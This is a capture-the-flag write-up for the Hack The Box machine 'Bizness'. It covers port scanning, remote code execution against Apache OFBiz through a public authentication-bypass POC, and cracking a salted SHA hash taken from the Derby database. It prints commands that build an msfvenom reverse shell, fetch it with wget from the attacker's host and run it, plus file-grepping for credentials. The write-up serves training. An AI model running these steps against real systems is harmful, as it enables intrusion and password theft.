# HTB - Bizness

### TL;DR
This is an Ubuntu machine running a vulnerable version of ApacheOFBiz. A POC can be used to attack the webserver running on port 80 an get initial foothold. The root password hash can be found in the file system in base64url format.

**KEYWORDS**<br>
Apache OFBiz, exploit search, java, base64url

**REFERENCES**<br>
https://ofbiz.apache.org<br>
https://www.cvedetails.com/cve/CVE-2023-51467<br>
https://www.cvedetails.com/cve/CVE-2023-49070<br>
https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass<br>
https://github.com/apache/ofbiz<br>
https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java<br>
<br>
### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-07 07:12 EST
Nmap scan report for 10.10.11.252
Host is up, received user-set (0.060s latency).
Not shown: 53021 closed tcp ports (conn-refused), 12509 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
443/tcp   open  https   syn-ack
33795/tcp open  unknown syn-ack
41659/tcp open  unknown syn-ack

Nmap done: 1 IP address (1 host up) scanned in 29.84 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80,443,33795,41659 -sV -sC -Pn -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-07 07:13 EST
Nmap scan report for 10.10.11.252
Host is up, received user-set (0.10s latency).
Scanned at 2024-01-07 07:13:30 EST for 20s

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   syn-ack nginx 1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b1822fdb92b020366b988850b66eda27
| SHA-1: 813885954343f40f937bcc8223af90523f5deb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
33795/tcp open  tcpwrapped syn-ack
41659/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 20.45 seconds
```
Enumerating the web site with Firefox, it seems it is built using Aache OFBiz (https://ofbiz.apache.org/).

![Untitled](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/eb3285ca-9ecf-40fe-8929-5512b90a7ce8)

For initial foothold, we'll focus on Apache OFBiz vulnerabilities.

### USER
Looking for ApacheOFBiz vulnerabilities, we came across these ones https://www.cvedetails.com/cve/CVE-2023-51467 and https://www.cvedetails.com/cve/CVE-2023-49070.<br>
<br>
And this POC https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass<br>
<br>
The exploit is supposed to provide direct RCE when executed against the host. First we can check if we have RC by issuing a ping command.
```markdown
> python3 exploit.py --url https://bizness.htb --cmd 'ping 10.10.xxx.xxx'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload
[+] The request has been successfully sent. Check the result of the command.
```
And verifying we receive replies in kali.
```markdown
> sudo tcpdump -i tun0 icmp         
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:51:44.559016 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 1, length 64
07:51:44.559027 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 1, length 64
07:51:45.535237 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 2, length 64
07:51:45.535254 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 2, length 64
07:51:46.530163 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 3, length 64
07:51:46.530203 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 3, length 64
07:51:47.503638 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 4, length 64
07:51:47.503654 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 4, length 64
07:51:48.479146 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 5, length 64
07:51:48.479172 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 5, length 64
07:51:49.455000 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 6, length 64
07:51:49.455019 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 6, length 64
07:51:50.435454 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 7, length 64
07:51:50.435471 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 7, length 64
07:51:51.413538 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 8, length 64
07:51:51.413558 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 8, length 64
07:51:52.387469 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 9, length 64
07:51:52.387485 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 9, length 64
07:51:53.374576 IP bizness.htb > 10.10.xxx.xxx: ICMP echo request, id 38936, seq 10, length 64
07:51:53.374592 IP 10.10.xxx.xxx > bizness.htb: ICMP echo reply, id 38936, seq 10, length 64
^C
76 packets captured
76 packets received by filter
0 packets dropped by kernel
```
Once we have verified the POC provides direct RCE, next step is get a reverse on the host. For this, first we create an `msfvenom` payload and serve it with a python web server, next we start a listener on port 9000, 
```markdown
> msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=9000 -f elf -a x64
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell

> python3 -m http.server 80
```
Then we use the POC to download and execute shell payload into the host.
```markdown
> python3 exploit.py --url https://bizness.htb --cmd 'wget http://10.10.14.137/shell'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

> python3 exploit.py --url https://bizness.htb --cmd 'chmod +x ./shell'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

> python3 exploit.py --url https://bizness.htb --cmd './shell'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```
A reverse shell is received on the listener, it can be used to get the user flag.

### ROOT
We start from the low-priv shell on the host looking for clear text passwords in `.xml` files the filesystem, particularly in the `/opt` directory, where Apache OFBiz is installed.
```markdown
grep --color=always -rn /opt -ie "PASSWORD" 2> /dev/null | grep xml
```
Some SHA hashes are found, none of them useful thoguh. Next step is to look for password or hashes in the binary files of the derby database.
```markdown
grep -E -i -a -o 'password(\W+\w+){0,5}' /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.dat
```
This command returns a hash contained the file `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat`
```markdown
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```
This cannot be cracked as-is, a little investigation is needed to find out where this hash comed from. We need to refer to the apache ofbiz source code (available at https://github.com/apache/ofbiz) to understand how this hash has been formed. In particular, source for the java app that generates the hash is located at https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java<br>
<br>
Reading the java code, we can see the hash is structured as: `$SHA$ + SALT +$ + HASH BYTES`. Also, it seems the hash bytes are base64url encoded.

![Untitled2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/99e7783a-b81b-4697-804a-b3a71297169c)

Base64url encoding is just a standard base64 encoding where url problematic characters, such as "/" or ".", are removed, so the resulting string can be used in URL's.<br>
<br>
So we can conclude that to obtain a crackable hash, we have to revert the process. First we need to re-add the url-removed characters, and then base64-decode the result.<br>
<br>
Transform base64url back to base64 by changing "_" as "/", and "-" as "+".<br>
`uP0_QaVBpDWFeo8-dRzDqRwXQ2I  uP0/QaVBpDWFeo8+dRzDqRwXQ2I`<br>
Once we have the base64 string, we just decode it and transofrm the result to hex, the final hash obtained is `b8fd3f41a541a435857a8f3e751cc3a91c174362`<br>
<br>
Final step is to crack the hash using hashcat, taking into account the salt (":d").<br>
```markdown
> hashcat -m 120 -a 0 -d 1 b8fd3f41a541a435857a8f3e751cc3a91c174362:d .\rockyou.txt
```

![Untitled3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/4963d14b-0116-4b41-aa07-081da25f80dc)

The resulting password can be used to `su root` as superuser and retrieve the flag.

